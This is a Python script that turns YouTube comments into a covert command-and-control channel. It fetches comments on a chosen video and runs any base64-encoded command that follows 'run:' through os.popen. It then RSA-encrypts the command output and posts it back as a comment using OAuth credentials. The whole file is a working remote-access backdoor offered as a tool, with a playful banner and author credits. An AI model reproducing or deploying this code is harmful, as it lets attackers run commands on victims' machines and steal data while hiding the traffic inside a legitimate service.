from googleapiclient.discovery import build
import base64
import os
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
import pickle
import rsa



def banner():
    print ("""
   /|
  / |
 /__|______
|  __  __  |
| |  ||  | |   Let's watch a video on YouTube!
| |  ||  | |
| |__||__| |_ 
|  __  __()|  
| |  ||  | |    
| |  ||  | |     
| |  ||  | |
| |__||__| |
|__________|
           
    @github : everthingBlackkk
    #Dev    : Yassin Mohamed
""")

API_KEY = "___"
VIDEO_ID = "___"

# RSA Public Key for encryption (replace with your own key)
RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCJKZ2jmOAntrg7OQJTvY/RQd49
vOOXBSnkjf5iaTy5HyoP+kFVt/oKQY5/88UJf9S4cWBYEu2byKDOJNaN5PkcRz5M
cWc5Jt3XH3fxjk7iL6To0OnCntUusuB8XSDZiotcjebwFb+QZHD0VEqxGeZeyMMH
0l4W53a+V25N5H4cOwIDAQAB
-----END PUBLIC KEY-----"""

SCOPES = ['https://www.googleapis.com/auth/youtube.force-ssl']

def get_credentials():
    creds = None
    if os.path.exists('token.pickle'):
        with open('token.pickle', 'rb') as token:
            creds = pickle.load(token)
    
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'client_secrets.json', SCOPES)
            creds = flow.run_local_server(port=8080)
        
        with open('token.pickle', 'wb') as token:
            pickle.dump(creds, token)
    
    return creds

def get_youtube_comments():
    youtube = build("youtube", "v3", developerKey=API_KEY)
    request = youtube.commentThreads().list(
        part="snippet",
        videoId=VIDEO_ID,
        maxResults=20,
        textFormat="plainText"
    )
    response = request.execute()
    return response["items"]

def encrypt_with_rsa(message):
    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(RSA_PUBLIC_KEY.encode('utf-8'))

    chunk_size = 100
    encrypted_chunks = []
    
    for i in range(0, len(message), chunk_size):
        chunk = message[i:i + chunk_size]
        encrypted_chunk = rsa.encrypt(chunk.encode('utf-8'), public_key)
        encoded_chunk = base64.b64encode(encrypted_chunk).decode('utf-8')
        encrypted_chunks.append(encoded_chunk)
    
    return "|||".join(encrypted_chunks)

def comment_on_video(encrypted_output):
    print("[*] Attempting to comment on the video...")
    credentials = get_credentials()
    youtube = build("youtube", "v3", credentials=credentials)
    
    body = {
        "snippet": {
            "videoId": VIDEO_ID,
            "topLevelComment": {
                "snippet": {
                    "textOriginal": encrypted_output
                }
            }
        }
    }
    
    try:
        request = youtube.commentThreads().insert(
            part="snippet",
            body=body
        )
        response = request.execute()
        print("[+] Comment posted successfully!")
    except Exception as e:
        print(f"[-] Failed to post comment: {e}")

def extract_and_run_commands(comments):
    found_command = False 
    for item in comments:
        comment_text = item["snippet"]["topLevelComment"]["snippet"]["textDisplay"]
        comment_author = item["snippet"]["topLevelComment"]["snippet"]["authorDisplayName"]
        
        # Check for comments that start with "run:"
        if comment_text.strip().lower().startswith("run:"):
            found_command = True
            print(f"Comment from {comment_author}: {comment_text}")
            
            encoded_command = comment_text.split("run:")[1].strip()
            try:
                decoded_bytes = base64.b64decode(encoded_command)
                command = decoded_bytes.decode("utf-8")
                print(f"[+] Command received and decoded: {command}")
                output = os.popen(command).read()
                print(f"[+] Command executed. Output:\n{output}")
                
                encrypted_output = encrypt_with_rsa(output)
                print(f"[+] Output encrypted and ready to comment.")
                
                comment_on_video(encrypted_output)
            except Exception as e:
                print(f"[-] Error decoding or executing the command: {e}")
    
    if not found_command:
        print("[*] No valid 'run:' command found in the comments.")

def main():
    banner()
    print("[*] Starting YouTube comment monitoring...")
    
    try:
        comments = get_youtube_comments()
        print(f"[+] Successfully fetched {len(comments)} comments")
        
        extract_and_run_commands(comments)
    except Exception as e:
        print(f"[-] Error fetching comments: {e}")

if __name__ == "__main__":
    main()
